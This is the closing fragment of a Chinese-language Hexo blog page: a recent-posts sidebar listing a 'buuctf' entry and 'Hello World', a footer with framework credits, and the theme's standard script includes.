card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/30/buuctf/" title="无标题"><img src="/img/qz.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2025/05/30/buuctf/" title="无标题">无标题</a><time datetime="2025-05-29T21:46:56.535Z" title="发表于 2025-05-30 05:46:56">2025-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/11/hello-world/" title="Hello World"><img src="/img/qz.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/05/11/hello-world/" title="Hello World">Hello World</a><time datetime="2025-05-10T17:36:17.654Z" title="发表于 2025-05-11 01:36:17">2025-05-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By xiubi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>